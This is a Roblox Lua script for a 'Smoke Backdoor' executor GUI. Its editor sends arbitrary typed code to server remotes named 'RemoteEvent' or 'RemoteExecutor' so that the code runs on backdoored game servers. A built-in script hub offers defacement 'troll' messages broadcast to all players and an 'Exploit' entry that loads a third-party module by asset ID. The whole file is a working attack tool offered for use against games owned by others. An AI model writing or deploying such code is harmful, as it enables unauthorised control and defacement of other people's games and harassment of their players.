local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local message = Instance.new("Message", workspace)
message.Text = "Thanks for using Smoke SS"
wait(1)
message:Destroy()

local UI = Instance.new("ScreenGui")
UI.Name = "SmokeBackdoor"
UI.ResetOnSpawn = false
UI.Parent = PlayerGui

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 600, 0, 380)
Main.Position = UDim2.new(0.5, -300, 0.5, -190)
Main.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
Main.BorderSizePixel = 0
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.Parent = UI
Main.Active = true
Main.Draggable = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)

local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 40)
TopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
TopBar.BorderSizePixel = 0
TopBar.Parent = Main
TopBar.Active = true
TopBar.Draggable = false
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -90, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Smoke Backdoor"
Title.Font = Enum.Font.GothamSemibold
Title.TextColor3 = Color3.fromRGB(240, 240, 240)
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TopBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 40, 1, 0)
CloseBtn.Position = UDim2.new(1, -45, 0, 0)
CloseBtn.BackgroundColor3 = Color3.fromRGB(36, 20, 20)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(240, 100, 100)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 18
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TopBar
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

local TabPanel = Instance.new("Frame")
TabPanel.Size = UDim2.new(0, 120, 1, -40)
TabPanel.Position = UDim2.new(0, 0, 0, 40)
TabPanel.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
TabPanel.BorderSizePixel = 0
TabPanel.Parent = Main
TabPanel.Active = true
TabPanel.Draggable = false
Instance.new("UICorner", TabPanel).CornerRadius = UDim.new(0, 12)

local EditorFrame = Instance.new("Frame")
EditorFrame.Size = UDim2.new(1, -120, 1, -65)
EditorFrame.Position = UDim2.new(0, 120, 0, 40)
EditorFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
EditorFrame.BorderSizePixel = 0
EditorFrame.Parent = Main
EditorFrame.Active = true
EditorFrame.Draggable = false
Instance.new("UICorner", EditorFrame).CornerRadius = UDim.new(0, 12)

local ScriptHubFrame = Instance.new("Frame")
ScriptHubFrame.Size = EditorFrame.Size
ScriptHubFrame.Position = EditorFrame.Position
ScriptHubFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
ScriptHubFrame.BorderSizePixel = 0
ScriptHubFrame.Parent = Main
ScriptHubFrame.Visible = false
Instance.new("UICorner", ScriptHubFrame).CornerRadius = UDim.new(0, 12)

local SettingsFrame = Instance.new("Frame")
SettingsFrame.Size = EditorFrame.Size
SettingsFrame.Position = EditorFrame.Position
SettingsFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
SettingsFrame.BorderSizePixel = 0
SettingsFrame.Parent = Main
SettingsFrame.Visible = false
Instance.new("UICorner", SettingsFrame).CornerRadius = UDim.new(0, 12)

local Editor = Instance.new("TextBox")
Editor.Size = UDim2.new(1, -120, 1, -90)
Editor.Position = UDim2.new(0, 20, 0, 20)
Editor.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
Editor.TextColor3 = Color3.fromRGB(235, 235, 235)
Editor.Font = Enum.Font.Code
Editor.TextSize = 16
Editor.ClearTextOnFocus = false
Editor.MultiLine = true
Editor.TextXAlignment = Enum.TextXAlignment.Left
Editor.TextYAlignment = Enum.TextYAlignment.Top
Editor.PlaceholderText = "Write your script..."
Editor.TextWrapped = true
Editor.Text = ""
Editor.BorderSizePixel = 0
Editor.Parent = EditorFrame
Instance.new("UICorner", Editor).CornerRadius = UDim.new(0, 8)

local EditorButtons = Instance.new("Frame")
EditorButtons.Size = UDim2.new(1, -40, 0, 50)
EditorButtons.Position = UDim2.new(0, 20, 1, -60)
EditorButtons.BackgroundTransparency = 1
EditorButtons.Parent = EditorFrame

local function createEditorButton(text, positionX)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 1, 0)
    btn.Position = UDim2.new(0, positionX, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(60, 130, 230)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 16
    btn.Font = Enum.Font.GothamBold
    btn.Text = text
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Parent = EditorButtons
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(90, 160, 255)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 130, 230)}):Play()
    end)
    return btn
end

local ExecuteBtn = createEditorButton("EXECUTE", 0)
local ClearBtn = createEditorButton("CLEAR", 120)
local ToggleMethodBtn = createEditorButton("METHOD", 240)

local ScriptList = Instance.new("ScrollingFrame")
ScriptList.Size = UDim2.new(1, -40, 1, -40)
ScriptList.Position = UDim2.new(0, 20, 0, 20)
ScriptList.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
ScriptList.BorderSizePixel = 0
ScriptList.CanvasSize = UDim2.new(0, 0, 5, 0)
ScriptList.ScrollBarThickness = 8
ScriptList.Parent = ScriptHubFrame
Instance.new("UICorner", ScriptList).CornerRadius = UDim.new(0, 8)

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 6)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Parent = ScriptList

local scripts = {
    ["Troll"] = {
        ["Hint Message"] = "local hint = Instance.new(\"Hint\", workspace)\nhint.Text = \"THIS GAME JUST GOT FUCKED BY PEPSI\"",
        ["Message Popup"] = "local message = Instance.new(\"Message\", workspace)\nmessage.Text = \"THIS GAME JUST GOT FUCKED BY PEPSI\"\nwait(1)\nmessage:Destroy()"
    },
    ["Utility"] = {
        ["Print Hello"] = "print(\"Hello from Smoke Backdoor\")"
    },
    ["Exploit"] = {
        ["Polaria Loader"] = { code = "require(123255432303221):Pload(\"Yournamehere\")", dangerous = true }
    }
}

local TabButtons = {}

local function clearScriptList()
    for _, v in ipairs(ScriptList:GetChildren()) do
        if v:IsA("TextButton") then
            v:Destroy()
        end
    end
end

local function createScriptButton(name, data)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(1, 0, 0, 40)
    Btn.BackgroundColor3 = Color3.fromRGB(60, 130, 230)
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 16
    Btn.Text = name
    Btn.BorderSizePixel = 0
    Btn.Parent = ScriptList
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
    Btn.MouseEnter:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(90, 160, 255)}):Play()
    end)
    Btn.MouseLeave:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 130, 230)}):Play()
    end)
    Btn.MouseButton1Click:Connect(function()
        if type(data)=="table" and data.code then
            Editor.Text = data.code
        elseif type(data)=="string" then
            Editor.Text = data
        end
        selectTab("Editor")
    end)
end

local function populateScriptHub()
    clearScriptList()
    for cat, group in pairs(scripts) do
        local CatBtn = Instance.new("TextButton")
        CatBtn.Size = UDim2.new(1, 0, 0, 30)
        CatBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        CatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        CatBtn.Font = Enum.Font.GothamBold
        CatBtn.TextSize = 14
        CatBtn.Text = cat
        CatBtn.BorderSizePixel = 0
        CatBtn.Parent = ScriptList
        Instance.new("UICorner", CatBtn).CornerRadius = UDim.new(0, 6)
        CatBtn.MouseEnter:Connect(function()
            TweenService:Create(CatBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(70, 70, 90)}):Play()
        end)
        CatBtn.MouseLeave:Connect(function()
            TweenService:Create(CatBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 40, 50)}):Play()
        end)
        for name, info in pairs(group) do
            createScriptButton(name, info)
        end
    end
end

TabButtons.Editor = (function()
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 44)
    btn.Position = UDim2.new(0, 10, 0, 10)
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.Text = "Editor"
    btn.BorderSizePixel = 0
    btn.Parent = TabPanel
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    return btn
end)()

TabButtons.ScriptHub = (function()
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 44)
    btn.Position = UDim2.new(0, 10, 0, 60)
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.Text = "Script Hub"
    btn.BorderSizePixel = 0
    btn.Parent = TabPanel
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    return btn
end)()

TabButtons.Settings = (function()
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 44)
    btn.Position = UDim2.new(0, 10, 0, 110)
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.Text = "Settings"
    btn.BorderSizePixel = 0
    btn.Parent = TabPanel
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    return btn
end)()

local currentRemoteEvent = nil
local currentRemoteFunction = nil

local function updateRemotes()
    currentRemoteEvent = ReplicatedStorage:FindFirstChild("RemoteEvent")
    if currentRemoteEvent and not currentRemoteEvent:IsA("RemoteEvent") then
        currentRemoteEvent = nil
    end

    currentRemoteFunction = ReplicatedStorage:FindFirstChild("RemoteExecutor")
    if currentRemoteFunction and not currentRemoteFunction:IsA("RemoteFunction") then
        currentRemoteFunction = nil
    end
end

-- Initial update
updateRemotes()

ReplicatedStorage.ChildAdded:Connect(function(child)
    if child.Name == "RemoteEvent" and child:IsA("RemoteEvent") then
        currentRemoteEvent = child
    elseif child.Name == "RemoteExecutor" and child:IsA("RemoteFunction") then
        currentRemoteFunction = child
    end
end)

ReplicatedStorage.ChildRemoved:Connect(function(child)
    if child == currentRemoteEvent then
        currentRemoteEvent = nil
    elseif child == currentRemoteFunction then
        currentRemoteFunction = nil
    end
end)

ExecuteBtn.MouseButton1Click:Connect(function()
    local StatusText = Instance.new("TextLabel")
    StatusText.Size = UDim2.new(1, 0, 0, 30)
    StatusText.Position = UDim2.new(0, 0, 1, -30)
    StatusText.BackgroundTransparency = 0.5
    StatusText.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
    StatusText.Text = "Executing..."
    StatusText.Parent = EditorFrame

    local scriptText = Editor.Text
    local success = false

    if currentRemoteEvent then
        local ok, err = pcall(function()
            currentRemoteEvent:FireServer(scriptText)
        end)
        if ok then
            StatusText.Text = "Sent via RemoteEvent!"
            success = true
        else
            StatusText.Text = "RemoteEvent error: "..tostring(err)
        end
    end

    if currentRemoteFunction then
        local ok, result = pcall(function()
            return currentRemoteFunction:InvokeServer(scriptText)
        end)
        if ok then
            StatusText.Text = tostring(result or "Executed via RemoteFunction")
            success = true
        else
            StatusText.Text = "RemoteFunction error: "..tostring(result)
        end
    end

    if not success then
        StatusText.Text = "No valid remote found"
    end

    wait(2)
    StatusText:Destroy()
end)

ClearBtn.MouseButton1Click:Connect(function()
    Editor.Text = ""
end)

local function selectTab(name)
    EditorFrame.Visible = (name == "Editor")
    ScriptHubFrame.Visible = (name == "ScriptHub")
    SettingsFrame.Visible = (name == "Settings")
end

TabButtons.Editor.MouseButton1Click:Connect(function()
    selectTab("Editor")
end)

TabButtons.ScriptHub.MouseButton1Click:Connect(function()
    populateScriptHub()
    selectTab("ScriptHub")
end)

TabButtons.Settings.MouseButton1Click:Connect(function()
    selectTab("Settings")
end)

ToggleMethodBtn.MouseButton1Click:Connect(function()
    -- Implement method toggle logic if you want
    print("METHOD toggle clicked (you can add logic here)")
end)

CloseBtn.MouseButton1Click:Connect(function()
    UI:Destroy()
end)

selectTab("Editor")
